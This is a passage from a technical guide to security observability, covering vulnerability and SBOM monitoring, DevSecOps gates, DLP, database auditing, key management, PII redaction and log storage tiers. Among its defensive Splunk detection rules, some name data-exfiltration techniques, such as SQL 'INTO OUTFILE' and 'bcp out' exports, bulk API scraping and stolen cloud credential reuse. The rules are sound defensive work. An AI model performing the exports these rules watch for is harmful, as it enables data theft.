      | where unique_resources > 5

  api_schema_violation:
    description: "Detect requests that violate expected API schema"
    monitoring: |
      # Monitor API schema validation failures
      metrics:
        - "api_schema_validation_failures_total{endpoint, violation_type}"
        # violation_types: unexpected_field, missing_required, wrong_type, extra_properties
      alerts:
        - alert: APISchemaViolationSpike
          expr: rate(api_schema_validation_failures_total[5m]) > 10
          labels: { severity: warning }
          annotations:
            summary: "High rate of API schema violations on {{ $labels.endpoint }}"
```

### 5.4 SBOM and Vulnerability Monitoring

```yaml
sbom_vulnerability_monitoring:
  sbom_formats:
    - name: "SPDX (ISO/IEC 5962:2021)"
      format: "JSON, XML, YAML, RDF, tag-value"
      use_case: "License compliance + vulnerability tracking"
    - name: "CycloneDX (OWASP)"
      format: "JSON, XML, Protocol Buffers"
      use_case: "Security-focused, supports VEX (Vulnerability Exploitability eXchange)"
    - name: "SWID Tags (ISO/IEC 19770-2)"
      format: "XML"
      use_case: "Software identification and asset management"

  vulnerability_pipeline: |
    +------------------------------------------------------------------+
    | Vulnerability Monitoring Pipeline                                  |
    +------------------------------------------------------------------+
    |                                                                    |
    | SBOM Generation     Vulnerability Scan    Prioritization          |
    | +-------------+     +--------------+      +------------------+   |
    | | Build CI/CD |---->| Match CVEs   |----->| EPSS Score       |   |
    | | (syft,      |     | (grype,      |      | + CVSS           |   |
    | |  trivy,     |     |  trivy,      |      | + Reachability   |   |
    | |  cdxgen)    |     |  Snyk,       |      | + Asset Crit.    |   |
    | +-------------+     |  Dependabot) |      | + Exploit Avail. |   |
    |                     +--------------+      +--------+---------+   |
    |                                                    |              |
    |                              +---------------------+              |
    |                              v                                    |
    | Tracking              Remediation            Reporting           |
    | +-------------+      +----------------+     +---------------+    |
    | | Vuln DB     |      | Auto-PR for    |     | Compliance    |    |
    | | (Jira,      |<---->| dependency     |     | reports       |    |
    | |  DefectDojo)|      | updates        |     | (PCI, SOC2)   |    |
    | +-------------+      +----------------+     +---------------+    |
    +------------------------------------------------------------------+

  observability_metrics:
    - "vulnerabilities_total{severity, status, application, age_bucket}"
    - "vulnerability_mttr_days{severity, application}"
    - "sbom_coverage_ratio"  # % of applications with current SBOM
    - "vulnerability_sla_compliance_ratio{severity}"
    - "exploitable_vulnerabilities_total{severity, epss_bucket}"

  prometheus_rules: |
    groups:
      - name: vulnerability_management
        rules:
          - alert: CriticalVulnerabilityOverdue
            expr: |
              vulnerabilities_total{severity="critical", status="open"}
              * on(vulnerability_id)
              group_left()
              (time() - vulnerability_discovered_timestamp > 30 * 86400)
              > 0
            labels: { severity: critical, compliance: "pci-dss" }
            annotations:
              summary: "Critical vulnerability open > 30 days (PCI-DSS violation)"

          - alert: HighEPSSVulnerability
            expr: vulnerability_epss_score > 0.5 AND vulnerabilities_total{status="open"} > 0
            labels: { severity: critical }
            annotations:
              summary: "Open vulnerability with EPSS > 50% (high exploitation probability)"
```

### 5.5 DevSecOps Pipeline Observability

```yaml
devsecops_pipeline_observability:
  pipeline_stages: |
    +------------------------------------------------------------------+
    | DevSecOps Pipeline with Observability                             |
    +------------------------------------------------------------------+
    |                                                                    |
    | Code       Build      Test       Deploy     Runtime               |
    | +------+   +------+   +------+   +------+   +------+             |
    | |SAST  |-->|SCA   |-->|DAST  |-->|IaC   |-->|RASP  |             |
    | |Secret|   |SBOM  |   |API   |   |Image |   |WAF   |             |
    | |Scan  |   |License|   |Sec   |   |Scan  |   |EDR   |             |
    | +------+   +------+   +------+   +------+   +------+             |
    |    |          |          |          |          |                   |
    |    v          v          v          v          v                   |
    | +------------------------------------------------------+         |
    | |          Security Observability Pipeline               |         |
    | |  (OTel Collector -> SIEM + Vulnerability Dashboard)   |         |
    | +------------------------------------------------------+         |
    +------------------------------------------------------------------+

  metrics_per_stage:
    code:
      - "sast_findings_total{severity, tool, repository}"
      - "secrets_detected_total{tool, repository, secret_type}"
      - "sast_scan_duration_seconds{tool, repository}"
      - "code_review_security_findings{repository, reviewer}"

    build:
      - "sca_vulnerabilities_total{severity, ecosystem, repository}"
      - "sbom_generated{format, repository}"
      - "license_violations_total{license, repository}"
      - "dependency_freshness_days{ecosystem, package}"

    test:
      - "dast_findings_total{severity, tool, application}"
      - "api_security_test_findings{severity, test_type, api}"
      - "fuzzing_crashes_total{fuzzer, target}"

    deploy:
      - "iac_misconfigurations_total{severity, tool, resource_type}"
      - "container_image_vulnerabilities{severity, image, registry}"
      - "deployment_policy_violations{policy, namespace}"

    runtime:
      - "waf_blocks_total{rule, application}"
      - "rasp_detections_total{attack_type, application}"
      - "runtime_vulnerability_exploits_total{cve, application}"

  security_gate_policy: |
    # Pipeline security gate: block deployment on critical findings
    security_gates:
      - stage: "build"
        block_on:
          - "sca_vulnerabilities{severity='critical', fixable='true'} > 0"
          - "secrets_detected > 0"
          - "license_violations{license='GPL-3.0'} > 0"  # if commercial project
        warn_on:
          - "sca_vulnerabilities{severity='high'} > 5"

      - stage: "test"
        block_on:
          - "dast_findings{severity='critical'} > 0"
          - "api_security_test_findings{severity='critical'} > 0"
        warn_on:
          - "dast_findings{severity='high'} > 3"

      - stage: "deploy"
        block_on:
          - "container_image_vulnerabilities{severity='critical', fixable='true'} > 0"
          - "iac_misconfigurations{severity='critical'} > 0"
          - "deployment_policy_violations > 0"
```

---

## 6. Data Security Observability

### 6.1 Data Loss Prevention (DLP) Monitoring

```yaml
dlp_observability:
  overview: |
    Data Loss Prevention monitoring observes data in three states:
    - Data at rest: stored in databases, file systems, cloud storage
    - Data in motion: traversing networks, APIs, email
    - Data in use: being processed by applications, accessed by users

  dlp_metrics:
    - "dlp_violations_total{channel, severity, data_type, action}"
    - "dlp_data_scanned_bytes{channel, data_type}"
    - "dlp_policy_matches_total{policy, channel, action}"
    - "dlp_incidents_total{severity, channel, resolution}"
    - "dlp_false_positive_rate{policy}"
    - "dlp_mean_time_to_remediate_seconds{severity}"

  channel_monitoring:
    email:
      signals:
        - "Outbound emails with attachments containing PII/PHI/PCI data"
        - "Emails to personal domains (gmail, yahoo) from corporate accounts"
        - "Large attachment sizes (> 10MB)"
        - "Encrypted/password-protected attachments (evasion technique)"
      query: |
        index=email_gateway direction=outbound
        (dlp_match="true" OR attachment_size > 10485760
         OR recipient_domain IN ("gmail.com","yahoo.com","hotmail.com","protonmail.com"))
        | stats count values(dlp_policy_matched) as policies
          values(recipient_domain) as dest_domains
          sum(attachment_size) as total_bytes
          by sender, span=1h
        | where count > 5 OR total_bytes > 52428800

    cloud_storage:
      signals:
        - "Public sharing of sensitive files (S3 bucket ACL, GCS IAM, Azure Blob)"
        - "Bulk download of sensitive documents"
        - "External sharing in SaaS platforms (SharePoint, Google Drive, Box)"
      query: |
        # AWS: Detect S3 bucket made public
        index=cloudtrail eventName IN ("PutBucketAcl", "PutBucketPolicy", "PutObjectAcl")
        | eval is_public=if(
            match(requestParameters, "AllUsers|AuthenticatedUsers|*.*.*.*"),
            "true", "false")
        | where is_public="true"
        | stats count by userIdentity.arn, requestParameters.bucketName

    endpoint:
      signals:
        - "USB device connections on endpoints with sensitive data"
        - "Print operations of sensitive documents"
        - "Screen capture of sensitive applications"
        - "Clipboard copy of sensitive data"
      monitoring: |
        # Sysmon Event ID 11 (File created) + DLP tag
        index=sysmon EventCode=11
        TargetFilename="*\\USB*" OR TargetFilename="E:\\*" OR TargetFilename="F:\\*"
        | stats count by Computer, User, TargetFilename
        | where count > 10

    api:
      signals:
        - "Bulk data export via API"
        - "API responses containing PII patterns"
        - "Data scraping patterns (sequential IDs, systematic enumeration)"
      detection: |
        # Detect bulk data extraction via API
        index=api_audit
        | stats sum(response_size) as total_bytes dc(resource_id) as unique_records
          by user, endpoint, span=1h
        | where total_bytes > 104857600 OR unique_records > 10000
        | eval alert="potential_data_exfiltration"
```

### 6.2 Database Activity Monitoring (DAM)

```yaml
database_activity_monitoring:
  overview: |
    Database Activity Monitoring captures and analyzes database activity to detect
    threats, enforce policies, and meet compliance requirements. DAM observability
    is critical for PCI-DSS (Req 10), HIPAA (audit controls), SOX (data integrity),
    and GDPR (data access logging).

  monitoring_layers:
    network_level:
      description: "Passive monitoring via network tap or span port"
      tools: ["Imperva DAM", "IBM Guardium", "Oracle Audit Vault"]
      pros: ["No database performance impact", "Hard to bypass"]
      cons: ["Cannot see encrypted connections", "Cannot see local connections"]

    agent_level:
      description: "Lightweight agent on database server"
      tools: ["CrowdStrike", "Imperva", "Oracle Audit Vault"]
      pros: ["Sees local and encrypted connections", "Lower latency"]
      cons: ["Slight performance impact", "Agent management overhead"]

    native_audit:
      description: "Database built-in audit logging"
      implementations:
        postgresql: |
          # PostgreSQL pgaudit configuration
          shared_preload_libraries = 'pgaudit'
          pgaudit.log = 'read, write, ddl, role'
          pgaudit.log_catalog = off
          pgaudit.log_parameter = on
          pgaudit.log_statement_once = on

          # OTel collection of PostgreSQL audit logs
          receivers:
            filelog/pgaudit:
              include: [/var/log/postgresql/postgresql-*.log]
              operators:
                - type: regex_parser
                  regex: '^(?P<timestamp>\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}\.\d+ \w+)\s+\[(?P<pid>\d+)\].*AUDIT:\s+(?P<audit_class>\w+),(?P<command_tag>\w+).*'

        mysql: |
          # MySQL Enterprise Audit Plugin
          [mysqld]
          plugin-load-add = audit_log.so
          audit_log_format = JSON
          audit_log_policy = ALL
          audit_log_file = /var/log/mysql/audit.log

        mssql: |
          -- SQL Server Audit
          CREATE SERVER AUDIT SecurityAudit
          TO FILE (FILEPATH = 'C:\AuditLogs\',
                   MAXSIZE = 1 GB,
                   MAX_ROLLOVER_FILES = 10)
          WITH (ON_FAILURE = CONTINUE);

          CREATE DATABASE AUDIT SPECIFICATION SensitiveDataAudit
          FOR SERVER AUDIT SecurityAudit
          ADD (SELECT, INSERT, UPDATE, DELETE ON SCHEMA::dbo BY [public])
          WITH (STATE = ON);

  detection_rules:
    - name: "Unusual query patterns"
      description: "Detect SQL queries that deviate from application baseline"
      query: |
        index=db_audit db_user NOT IN (lookup:approved_service_accounts)
        | stats dc(query_hash) as unique_queries count by db_user, db_name, span=1h
        | where unique_queries > 50 OR count > 1000

    - name: "Privilege escalation in database"
      description: "Detect GRANT statements giving elevated privileges"
      query: |
        index=db_audit command_tag IN ("GRANT", "ALTER ROLE", "CREATE USER")
        | stats count by db_user, command_text, db_name

    - name: "Data exfiltration via SELECT INTO OUTFILE"
      description: "Detect data export via SQL statements"
      query: |
        index=db_audit command_text="*INTO OUTFILE*" OR command_text="*INTO DUMPFILE*"
        OR command_text="*COPY.*TO*" OR command_text="*bcp*out*"
        | stats count by db_user, command_text, db_name

    - name: "Off-hours database access"
      description: "Detect interactive database queries outside business hours"
      query: |
        index=db_audit db_user NOT IN (lookup:service_accounts)
        (date_hour < 6 OR date_hour > 22 OR date_wday IN ("saturday","sunday"))
        | stats count by db_user, db_name, command_tag
```

### 6.3 Encryption and Key Management Monitoring

```yaml
encryption_monitoring:
  key_management_observability:
    metrics:
      - "kms_key_operations_total{operation, key_id, principal}"
      - "kms_key_rotation_age_days{key_id, key_type}"
      - "tls_certificate_expiry_days{domain, issuer}"
      - "encryption_at_rest_coverage_ratio{service, region}"
      - "encryption_in_transit_ratio{service, protocol}"

    aws_kms_monitoring: |
      # Monitor AWS KMS operations via CloudTrail
      index=cloudtrail eventSource="kms.amazonaws.com"
      eventName IN ("Decrypt", "GenerateDataKey", "CreateGrant", "DisableKey",
                     "ScheduleKeyDeletion", "PutKeyPolicy")
      | stats count by eventName, userIdentity.arn, resources{}.ARN, span=1h
      | eval alert=case(
          eventName=="ScheduleKeyDeletion", "critical",
          eventName=="DisableKey", "high",
          eventName=="PutKeyPolicy", "high",
          eventName=="CreateGrant" AND count > 10, "medium",
          eventName=="Decrypt" AND count > 1000, "medium"
        )
      | where alert IS NOT NULL

    certificate_monitoring: |
      # Prometheus: Monitor TLS certificate expiration
      - alert: TLSCertExpiringSoon
        expr: |
          (probe_ssl_earliest_cert_expiry - time()) / 86400 < 30
        for: 1h
        labels: { severity: warning }
        annotations:
          summary: "TLS certificate for {{ $labels.instance }} expires in {{ $value | humanize }} days"

      - alert: TLSCertExpiryCritical
        expr: |
          (probe_ssl_earliest_cert_expiry - time()) / 86400 < 7
        for: 1h
        labels: { severity: critical }
        annotations:
          summary: "TLS certificate for {{ $labels.instance }} expires in {{ $value | humanize }} days"

    key_rotation_compliance: |
      # Monitor key rotation compliance
      - alert: KMSKeyRotationOverdue
        expr: kms_key_rotation_age_days > 365
        labels:
          severity: warning
          compliance: "pci-dss,nist-800-53"
        annotations:
          summary: "KMS key {{ $labels.key_id }} has not been rotated in {{ $value }} days"
```

### 6.4 PII Detection and Redaction in Observability Pipelines

```yaml
pii_handling_in_observability:
  the_problem: |
    Observability data (logs, traces, metrics labels) frequently contains PII:
    - Email addresses in log messages
    - IP addresses (considered PII under GDPR)
    - Credit card numbers in error logs
    - Social security numbers in debug output
    - Medical record numbers in health application logs
    - Session tokens and authentication credentials

    If PII enters the observability pipeline unredacted, it creates compliance risk
    (GDPR, CCPA, HIPAA) and expands the scope of security controls.

  otel_collector_pii_redaction: |
    # OTel Collector configuration for PII redaction
    processors:
      # Redaction processor (contrib)
      redaction/pii:
        # Allow-list approach: only keep known-safe attributes
        allow_all_keys: false
        allowed_keys:
          - "http.request.method"
          - "http.response.status_code"
          - "url.path"
          - "service.name"
          - "host.name"
          - "log.level"
        # Block specific patterns
        blocked_values:
          - "\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}\\b"  # Email
          - "\\b\\d{3}-\\d{2}-\\d{4}\\b"  # SSN (US)
          - "\\b\\d{4}[- ]?\\d{4}[- ]?\\d{4}[- ]?\\d{4}\\b"  # Credit card
          - "\\b\\d{3}[- ]?\\d{3}[- ]?\\d{4}\\b"  # Phone (US)
        summary: debug  # Log redaction actions for auditing

      # Transform processor for more granular control
      transform/pii_redaction:
        log_statements:
          - context: log
            statements:
              # Redact email addresses in log body
              - replace_pattern(body, "\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}\\b", "[EMAIL_REDACTED]")

              # Redact credit card numbers (Luhn-valid patterns)
              - replace_pattern(body, "\\b(?:4\\d{3}|5[1-5]\\d{2}|3[47]\\d{2}|6\\d{3})[- ]?\\d{4}[- ]?\\d{4}[- ]?\\d{0,4}\\b", "[CC_REDACTED]")

              # Redact SSN
              - replace_pattern(body, "\\b\\d{3}-\\d{2}-\\d{4}\\b", "[SSN_REDACTED]")

              # Hash IP addresses (preserves correlation without exposing PII)
              - replace_pattern(attributes["client.address"], "\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b", SHA256("$0"))

        trace_statements:
          - context: span
            statements:
              # Redact query parameters that may contain PII
              - replace_pattern(attributes["url.query"], "email=[^&]+", "email=[REDACTED]")
              - replace_pattern(attributes["url.query"], "ssn=[^&]+", "ssn=[REDACTED]")
              - replace_pattern(attributes["url.query"], "phone=[^&]+", "phone=[REDACTED]")

              # Redact database statements (may contain PII in WHERE clauses)
              - replace_pattern(attributes["db.statement"], "'[^']*@[^']*'", "'[EMAIL_REDACTED]'")

  privacy_preserving_patterns:
    tokenization: |
      # Replace PII with reversible tokens (for authorized re-identification)
      # Requires a secure tokenization service
      processors:
        transform/tokenize:
          log_statements:
            - context: log
              statements:
                # Tokenize user IDs (preserves correlation, removes direct identification)
                - set(attributes["user.token"], SHA256(Concat(attributes["enduser.id"], "${TOKEN_SALT}")))
                - delete_key(attributes, "enduser.id")

    differential_privacy: |
      # Add noise to metrics to prevent individual identification
      # Useful for aggregate metrics that could reveal individual behavior
      # Example: Add Laplacian noise to user count metrics
      processors:
        transform/dp_noise:
          metric_statements:
            - context: datapoint
              conditions:
                - 'metric.name == "user_actions_total"'
              statements:
                # Round values to nearest 5 (k-anonymity approximation)
                - set(value_int, Int(value_int / 5) * 5)

    data_minimization: |
      # Collect only what's needed (GDPR data minimization principle)
      processors:
        filter/minimize:
          logs:
            exclude:
              match_type: strict
              resource_attributes:
                - key: data.classification
                  value: "pii_verbose"  # Exclude verbose PII logs
          traces:
            span:
              exclude:
                match_type: regexp
                attributes:
                  - key: db.statement
                    value: ".*(INSERT INTO|UPDATE).*personal_data.*"
```

### 6.5 Privacy-Preserving Observability Patterns

```yaml
privacy_preserving_observability:
  principles:
    - name: "Data minimization"
      description: "Collect only the telemetry data necessary for observability goals"
      implementation: "Filter at source, not at destination"

    - name: "Purpose limitation"
      description: "Use observability data only for its stated purpose"
      implementation: "RBAC on observability platforms, audit access"

    - name: "Storage limitation"
      description: "Retain data only as long as necessary"
      implementation: "Automated retention policies, tiered storage"

    - name: "Pseudonymization"
      description: "Replace direct identifiers with pseudonyms"
      implementation: "Hash/tokenize user IDs, IPs in the OTel pipeline"

    - name: "Access control"
      description: "Restrict who can see what in observability data"
      implementation: "Field-level security in Elasticsearch, Splunk RBAC"

  architecture: |
    +------------------------------------------------------------------+
    | Privacy-Preserving Observability Architecture                     |
    +------------------------------------------------------------------+
    |                                                                    |
    | Application          OTel Collector         Storage               |
    | +----------+         +--------------+        +---------+          |
    | |Raw       |  OTLP   |1. PII        |  clean |Redacted |          |
    | |telemetry |-------->|   detection  |------->|data for |          |
    | |with PII  |         |2. Redaction  |        |general  |          |
    | +----------+         |3. Tokenize   |        |access   |          |
    |                      |4. Minimize   |        +---------+          |
    |                      +--------------+                             |
    |                             |                                      |
    |                             | encrypted                           |
    |                             v                                      |
    |                      +--------------+                             |
    |                      |Full-fidelity |  (restricted access,         |
    |                      |archive       |   encrypted at rest,         |
    |                      |(compliance/  |   audit-logged,              |
    |                      | forensics)   |   auto-expire)              |
    |                      +--------------+                             |
    +------------------------------------------------------------------+

  field_level_security_example:
    elasticsearch: |
      # Elasticsearch: Field-level security for PII
      PUT _security/role/observability_analyst
      {
        "indices": [
          {
            "names": ["logs-*"],
            "privileges": ["read"],
            "field_security": {
              "grant": ["*"],
              "except": ["user.email", "client.ip", "user.full_name", "url.query"]
            }
          }
        ]
      }

      # Separate role for privacy officer / security investigator
      PUT _security/role/security_investigator
      {
        "indices": [
          {
            "names": ["logs-*"],
            "privileges": ["read"],
            "field_security": {
              "grant": ["*"]  # Full access including PII fields
            }
          }
        ],
        "metadata": {
          "access_justification": "Security investigation - all access logged"
        }
      }
```

---

## 7. Security Observability Architecture

### 7.1 Reference Architecture

```
+=========================================================================+
|                SECURITY OBSERVABILITY REFERENCE ARCHITECTURE              |
+=========================================================================+
|                                                                           |
| TIER 1: COLLECTION                                                       |
| +-----------------------------------------------------------------------+|
| |                                                                       ||
| | Endpoints    Network       Cloud          Applications   Identity     ||
| | +--------+   +--------+   +--------+     +--------+     +--------+   ||
| | |EDR/XDR |   |FW/IPS  |   |Control |     |OTel SDK|     |IdP Logs|   ||
| | |Sysmon  |   |NDR     |   |Plane   |     |WAF     |     |AD Logs |   ||
| | |auditd  |   |NetFlow |   |Data    |     |RASP    |     |SSO Logs|   ||
| | |eBPF    |   |DNS     |   |Plane   |     |AppLogs |     |MFA Logs|   ||
| | +---+----+   +---+----+   +---+----+     +---+----+     +---+----+   ||
| |     |            |            |               |              |        ||
| +-----------------------------------------------------------------------+|
|       |            |            |               |              |         |
|       v            v            v               v              v         |
| TIER 2: PROCESSING                                                       |
| +-----------------------------------------------------------------------+|
| |                                                                       ||
| | +-------------------------------------------------------------------+ ||
| | |              OTel Collector Fleet (Gateway + Agent mode)          | ||
| | |                                                                   | ||
| | | Receivers:  filelog, syslog, otlp, windowseventlog, journald,    | ||
| | |             awss3, kafkareceiver, webhookevent                    | ||
| | |                                                                   | ||
| | | Processors: transform (enrich, classify, redact PII)             | ||
| | |             filter (noise reduction)                              | ||
| | |             routing (by data type, compliance scope)             | ||
| | |             batch, memory_limiter                                 | ||
| | |                                                                   | ||
| | | Exporters:  splunkhec, elasticsearch, kafka, awss3, otlphttp     | ||
| | +-------------------------------------------------------------------+ ||
| |                                                                       ||
| | Additional Processing:                                                ||
| | +----------------+  +------------------+  +----------------------+   ||
| | |Threat Intel    |  |UEBA Engine       |  |Stream Processing     |   ||
| | |Enrichment      |  |(Baseline, ML)    |  |(Kafka Streams/Flink) |   ||
| | |(STIX/TAXII     |  |                  |  |Real-time correlation |   ||
| | | feeds)         |  |                  |  |                      |   ||
| | +----------------+  +------------------+  +----------------------+   ||
| +-----------------------------------------------------------------------+|
|                                                                           |
| TIER 3: STORAGE                                                          |
| +-----------------------------------------------------------------------+|
| |                                                                       ||
| | Hot (0-30d)       Warm (30-90d)      Cold (90d-1yr)    Archive (1yr+)||
| | +------------+    +------------+     +------------+    +----------+  ||
| | |Elasticsearch|    |Elasticsearch|    |S3/GCS/Blob |    |Glacier/  |  ||
| | |Splunk Hot   |    |Splunk Warm  |    |Parquet     |    |Archive   |  ||
| | |             |    |             |    |            |    |          |  ||
| | |Query: <1s   |    |Query: <30s  |    |Query: <5m  |    |Restore:  |  ||
| | |             |    |             |    |            |    | <24h     |  ||
| | +------------+    +------------+     +------------+    +----------+  ||
| |                                                                       ||
| | Search Acceleration:                                                  ||
| | +-------------------------------------------------------------------+ ||
| | | Splunk Data Model Acceleration / ES|QL / Columnar Index           | ||
| | | Pre-computed summaries for SOC dashboards                         | ||
| | +-------------------------------------------------------------------+ ||
| +-----------------------------------------------------------------------+|
|                                                                           |
| TIER 4: ANALYSIS                                                         |
| +-----------------------------------------------------------------------+|
| |                                                                       ||
| | +----------+  +----------+  +----------+  +----------+  +----------+ ||
| | |SIEM      |  |Threat    |  |UEBA      |  |Threat    |  |Compliance| ||
| | |Detection |  |Hunting   |  |Analytics |  |Intel     |  |Dashboard | ||
| | |Engine    |  |Workbench |  |          |  |Platform  |  |          | ||
| | +----------+  +----------+  +----------+  +----------+  +----------+ ||
| +-----------------------------------------------------------------------+|
|                                                                           |
| TIER 5: RESPONSE                                                         |
| +-----------------------------------------------------------------------+|
| |                                                                       ||
| | +----------+  +----------+  +----------+  +----------+  +----------+ ||
| | |SOAR      |  |Ticketing |  |ChatOps   |  |Auto-     |  |Forensics | ||
| | |Playbooks |  |(Jira,    |  |(Slack,   |  |Containment| |Workstation||
| | |          |  | SNOW)    |  | Teams)   |  |          |  |          | ||
| | +----------+  +----------+  +----------+  +----------+  +----------+ ||
| +-----------------------------------------------------------------------+|
+=========================================================================+
```

### 7.2 Hot/Warm/Cold Storage for Security Data

```yaml
security_data_storage_tiers:
  hot:
    purpose: "Real-time detection, active investigation, SOC dashboards"
    retention: "7-30 days"
    storage: "SSD-backed Elasticsearch/Splunk/Sentinel"
    query_latency: "< 1 second"
    data_types:
      - "All security alerts and incidents"
      - "Authentication logs"
      - "Network firewall logs"
      - "EDR telemetry"
      - "Cloud control plane logs"
      - "Application security logs"
    cost: "$$$$ (highest per GB)"
    sizing_guidance: |
      # Hot tier sizing calculation
      hot_tier_gb = daily_ingest_gb * retention_days * replication_factor
      # Example: 100 GB/day * 30 days * 1.5 (replication) = 4,500 GB
      # Typical cost: $0.10-0.50/GB/month on-prem, $2-8/GB/month SaaS SIEM

  warm:
    purpose: "Extended investigation, compliance queries, trend analysis"
    retention: "30-90 days"
    storage: "HDD-backed Elasticsearch (frozen tier) or Splunk SmartStore"
    query_latency: "5-30 seconds"
    data_types:
      - "Same as hot, with reduced indexing/acceleration"
      - "Verbose logs (debug, DNS queries, full packet metadata)"
    cost: "$$ (medium per GB)"
    configuration:
      elasticsearch: |
        # Elasticsearch ILM policy for security data
        PUT _ilm/policy/security-data
        {
          "policy": {
            "phases": {
              "hot": {
                "min_age": "0ms",
                "actions": {
                  "rollover": { "max_size": "50gb", "max_age": "1d" },
                  "set_priority": { "priority": 100 }
                }
              },
              "warm": {
                "min_age": "30d",
                "actions": {
                  "shrink": { "number_of_shards": 1 },
                  "forcemerge": { "max_num_segments": 1 },
                  "set_priority": { "priority": 50 },
                  "allocate": {
                    "require": { "data": "warm" }
                  }
                }
              },
              "cold": {
                "min_age": "90d",
                "actions": {
                  "searchable_snapshot": {
                    "snapshot_repository": "security-snapshots"
                  },
                  "set_priority": { "priority": 0 }
                }
              },
              "frozen": {
                "min_age": "180d",
                "actions": {
                  "searchable_snapshot": {
                    "snapshot_repository": "security-snapshots"
                  }
                }
              },
              "delete": {
                "min_age": "365d",
                "actions": { "delete": {} }
              }
            }
          }
        }

  cold:
    purpose: "Compliance retention, forensic preservation, historical analysis"
    retention: "90 days - 1 year"
    storage: "Object storage (S3/GCS/Blob) with columnar format (Parquet/ORC)"
    query_latency: "1-5 minutes (requires data scanning)"
    query_tools: ["AWS Athena", "BigQuery", "Azure Synapse", "Trino/Presto"]
    data_types:
      - "All log data past warm retention"
      - "Full network flow records"
      - "Raw database audit logs"
    cost: "$ (low per GB)"
    configuration:
      athena_query_example: |
        -- Query cold security logs via Athena
        SELECT
          timestamp,
          source_ip,
          destination_ip,
          event_type,
          user_name,
          action,
          status
        FROM security_logs_parquet
        WHERE year = '2025' AND month = '01'
          AND event_type = 'authentication_failure'
          AND source_ip = '203.0.113.42'
        ORDER BY timestamp;

  archive:
    purpose: "Legal hold, regulatory compliance (7+ years)"
    retention: "1-7+ years"
    storage: "Glacier Deep Archive / Azure Archive / GCS Archive"
    query_latency: "Hours to days (restore required)"
    cost: "$ (minimal per GB, ~$0.001/GB/month)"
    access: "Restore on demand for legal/forensic investigations"
    configuration:
      s3_lifecycle: |
        {
          "Rules": [
            {
              "ID": "SecurityLogArchive",
              "Status": "Enabled",
              "Transitions": [
                { "Days": 365, "StorageClass": "GLACIER" },
                { "Days": 730, "StorageClass": "DEEP_ARCHIVE" }
              ],
              "Expiration": { "Days": 2557 }
            }
          ]
        }
```

### 7.3 Multi-Cloud Security Observability

```yaml
multi_cloud_security_observability:
  challenges:
    - "Different log formats (CloudTrail vs. Activity Log vs. Audit Log)"
    - "Different identity systems (IAM vs. Entra ID vs. Google Identity)"
    - "Different network constructs (VPC vs. VNet vs. VPC)"
    - "No unified control plane"
    - "Cross-cloud attack paths"

  unified_architecture: |
    +------------------------------------------------------------------+
    | Multi-Cloud Security Observability                                 |
    +------------------------------------------------------------------+
    |                                                                    |
    | AWS                  Azure                GCP                     |
    | +----------+         +----------+         +----------+            |
    | |CloudTrail|         |Activity  |         |Cloud     |            |
    | |GuardDuty |         |Log       |         |Audit Log |            |
    | |VPC Flow  |         |NSG Flow  |         |VPC Flow  |            |
    | |Config    |         |Defender  |         |SCC       |            |
    | +----+-----+         +----+-----+         +----+-----+            |
    |      |                    |                    |                   |
    |      v                    v                    v                   |
    | +----------------------------------------------------------+     |
    | |          OTel Collector (per-cloud gateway)                |     |
    | |                                                            |     |
    | | AWS Collector:     Azure Collector:    GCP Collector:      |     |
    | | - awss3 receiver   - Azure Event Hub   - Pub/Sub receiver |     |
    | | - CloudTrail       - Activity Log      - Audit Log parse  |     |
    | |   parsing          - Defender alerts   - SCC findings     |     |
    | +----------------------------+-------------------------------+     |
    |                              |                                     |
    |                              v                                     |
    | +----------------------------------------------------------+     |
    | |           Centralized SIEM / Security Data Lake            |     |
    | |                                                            |     |
    | | Normalization to common schema:                            |     |
    | | - OCSF (Open Cybersecurity Schema Framework)              |     |
    | | - or ECS (Elastic Common Schema)                          |     |
    | | - or ASIM (Microsoft Advanced Security Information Model) |     |
    | +----------------------------------------------------------+     |
    +------------------------------------------------------------------+

  schema_normalization:
    ocsf_mapping:
      description: "OCSF (Open Cybersecurity Schema Framework) provides a vendor-neutral schema for security events"
      example_authentication_event: |
        {
          "class_uid": 3002,
          "class_name": "Authentication",
          "category_uid": 3,
          "category_name": "Identity & Access Management",
          "severity_id": 1,
          "activity_id": 1,
          "activity_name": "Logon",
          "status_id": 1,
          "status": "Success",
          "time": 1705334400000,
          "actor": {
            "user": {
              "name": "jdoe",
              "uid": "arn:aws:iam::123456789:user/jdoe",
              "type_id": 1
            },
            "session": {
              "uid": "session-abc123"
            }
          },
          "src_endpoint": {
            "ip": "203.0.113.42",
            "location": {
              "country": "US",
              "city": "New York"
            }
          },
          "dst_endpoint": {
            "svc_name": "AWS Console"
          },
          "auth_protocol_id": 99,
          "auth_protocol": "SAML",
          "metadata": {
            "product": {
              "name": "AWS CloudTrail",
              "vendor_name": "Amazon"
            },
            "version": "1.3.0"
          }
        }

  cross_cloud_detection_rules:
    - name: "Cross-cloud lateral movement"
      description: "Detect user accessing multiple cloud providers from same unusual IP"
      query: |
        (index=cloudtrail OR index=azure_activity OR index=gcp_audit)
        | stats dc(cloud_provider) as cloud_count
                values(cloud_provider) as clouds
                dc(action) as unique_actions
          by src_ip, user, span=1h
        | where cloud_count >= 2
        | lookup ip_reputation src_ip OUTPUT risk_score
        | where risk_score > 50 OR NOT cidrmatch("10.0.0.0/8", src_ip)

    - name: "Cloud credential theft and reuse"
      description: "Detect stolen cloud credentials used from new location"
      query: |
        (index=cloudtrail OR index=azure_signin)
        | iplocation src_ip
        | stats dc(Country) as countries values(Country) as country_list
                min(_time) as first_seen max(_time) as last_seen
          by user, span=1h
        | where countries > 1
        | eval time_diff=last_seen-first_seen
        | where time_diff < 3600  # Same user, different countries, within 1 hour
```

### 7.4 Cost Optimization for Security Data

```yaml
security_data_cost_optimization:
  cost_drivers: |
    Security data is expensive because:
    1. Volume: Security logs are verbose (especially network, DNS, EDR)
    2. Retention: Compliance requires long retention (1-7 years)
    3. Performance: SOC requires real-time query performance
    4. Redundancy: Multiple copies for HA and compliance
    5. No sampling: Unlike observability data, security data cannot be sampled

  optimization_strategies:
    tiered_storage:
      description: "Move data to cheaper tiers as it ages"
      savings: "60-80% compared to keeping everything in hot tier"
      implementation: "See Section 7.2 above"

    intelligent_routing:
      description: "Route different data types to appropriate cost tiers from the start"
      otel_config: |
        # OTel Collector routing by security value
        processors:
